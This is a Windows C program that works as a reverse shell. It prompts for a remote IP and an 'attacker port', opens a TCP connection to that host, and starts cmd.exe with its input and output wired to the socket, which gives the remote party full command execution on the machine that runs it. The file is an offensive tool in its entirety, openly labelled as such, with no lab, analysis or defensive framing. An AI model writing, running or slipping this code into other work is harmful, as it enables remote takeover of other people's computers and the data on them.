#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#define MAX_IP_LENGTH 16

int validateIPAddress(const char *ip) {
    struct sockaddr_in sa;
    int result = inet_pton(AF_INET, ip, &(sa.sin_addr));
    return result != 0;
}

int validatePortNumber(int port) {
    return port > 0 && port <= 65535;
}

int main(void) {
    char remoteIP[MAX_IP_LENGTH];
    int attackerPort;

    printf("Enter the remote IP address: ");
    fgets(remoteIP, MAX_IP_LENGTH, stdin);

    // Remove the trailing newline character
    remoteIP[strcspn(remoteIP, "\n")] = '\0';

    while (!validateIPAddress(remoteIP)) {
        printf("Invalid IP address. Enter the remote IP address: ");
        fgets(remoteIP, MAX_IP_LENGTH, stdin);

        // Remove the trailing newline character
        remoteIP[strcspn(remoteIP, "\n")] = '\0';
    }

    printf("Enter the attacker port number: ");
    scanf("%d", &attackerPort);

    while (!validatePortNumber(attackerPort)) {
        printf("Invalid port number. Enter the attacker port number: ");
        scanf("%d", &attackerPort);
    }

    // Clear the input buffer
    while (getchar() != '\n')
        ;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("[ERROR] WSAStartup failed.\n");
        return 1;
    }

    SOCKET sockt;
    struct sockaddr_in sa;

    sockt = socket(AF_INET, SOCK_STREAM, 0);
    if (sockt == INVALID_SOCKET) {
        printf("[ERROR] Failed to create socket.\n");
        WSACleanup();
        return 1;
    }

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(remoteIP);
    sa.sin_port = htons(attackerPort);

    if (connect(sockt, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        printf("[ERROR] Connection failed.\n");
        closesocket(sockt);
        WSACleanup();
        return 1;
    }

    STARTUPINFOA startupInfo;
    PROCESS_INFORMATION processInfo;

    memset(&startupInfo, 0, sizeof(startupInfo));
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.dwFlags = STARTF_USESTDHANDLES;
    startupInfo.hStdInput = (HANDLE)sockt;
    startupInfo.hStdOutput = (HANDLE)sockt;
    startupInfo.hStdError = (HANDLE)sockt;

    char command[] = "cmd.exe";
    if (!CreateProcessA(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo)) {
        printf("[ERROR] Failed to create process.\n");
        closesocket(sockt);
        WSACleanup();
        return 1;
    }

    WaitForSingleObject(processInfo.hProcess, INFINITE);

    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);
    closesocket(sockt);
    WSACleanup();

    return 0;
}
